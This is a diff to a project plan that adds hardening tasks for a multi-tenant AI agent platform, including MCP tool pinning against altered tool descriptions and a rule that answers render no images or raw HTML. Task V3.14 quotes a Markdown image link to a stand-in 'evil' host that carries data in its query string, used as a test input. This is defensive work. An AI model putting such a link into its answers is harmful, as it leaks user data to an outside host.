@@ -110,6 +110,21 @@ Definition of done: a new tenant with a non-Olist business scenario can be creat
 | V3.07 | Conversation management: rename, delete or archive, restore and bulk delete; session metadata stored separately from runs so audit and traces remain intact | - | Rename and delete work from the sidebar; a deleted conversation disappears without deleting its runs or traces; an admin can restore it | v3 acceptance |
 | V3.08 | Generic connector acceptance: add a second non-Olist connector and create a new tenant and business scenario from the UI only; no code or YAML change. This is the v3 definition of done | - | The new tenant uses its own users, model, MCP server, agent preset and knowledge base; the Olist demo still passes its existing tests | v3 acceptance |
 
+### v3 hardening
+
+Found in a review on 2026-11-16. Estimates are agent hours, based on the pace of the V3 slices so far, and are targets, not measurements.
+
+| ID | Task | Est. h | Verification | AC |
+| --- | --- | --- | --- | --- |
+| V3.09 | Presets over registered agents: `ChatRequest.preset` becomes `auto` or any registered agent id, checked against the tenant's allowed agents; the composer lists the tenant's agents from the control plane (ADR 0011). Blocks V3.08 | 1 | An agent registered for a new tenant appears in the composer and runs as a preset; an unregistered or disallowed id returns 422; no agent name is a literal in core | v3 acceptance |
+| V3.10 | MCP tool pinning: store a SHA-256 of each tool's name, description and input schema when an admin approves a source; compare on every `tools/list`; a changed or new tool is disabled and shown as "changed, needs approval" in settings until re-approved; one contract test per source (olist, reviews, catalog) that the live `tools/list` matches its manifest | 4 | Editing a tool description on a running server disables that tool on the next run and writes an audit row; re-approval enables it; the three contract tests pass | design 7.3, ADR 0014 |
+| V3.11 | MCP session reuse and list changes: one MCP client session per run and source instead of one per call; handle `notifications/tools/list_changed` by re-listing and re-pinning (V3.10) | 3 | A run with three tool calls to one server performs one `initialize` (span count); a server that adds a tool triggers a re-list without an API restart | design 7.2 |
+| V3.12 | Token estimate and history budget: count CJK characters as about one token each, calibrate against the last provider-reported usage, and trim history by token budget instead of a fixed turn count | 2 | A Chinese prompt's estimate is within the error band recorded against provider usage on 10 dev cases; a session with long answers stays under the context limit | design 8.6, ADR 0012 |
+| V3.13 | MCP server span parenting: server-side `tools/call` and `execute_tool` spans continue the client span from `traceparent`, so the trace tree nests them under the tool call | 1 | The trace tree of a data run shows server spans as children of the client tool span | design 12 |
+| V3.14 | UI exfiltration rule: design 13.1 states that answers never render images or raw HTML and that links show their host; a unit test asserts the Markdown renderer emits no `img` and no raw HTML for injected input | 1 | Test passes; an answer containing `![x](https://evil/?q=data)` renders as text | design 13.1 |
+| V3.15 | Citation chips grouped by source: one chip per document or tool result listing its refs (for example `returns-policy · d1, d3`); inline markers unchanged | 1 | Two refs from one document produce one chip | AC-10 |
+| V3.16 | [human] Multi-session memory dataset: author writes 20 cases (fact in session one, question in session two) from a brief; the agent runs them with history off and with layers 1 to 4, then records whether T3.11 resumes | 2 (+2 author) | Report under `evals/reports/` with both runs; T3.11 status updated from the result | ADR 0012 |
+
 ## Dependencies
 
 ```mermaid
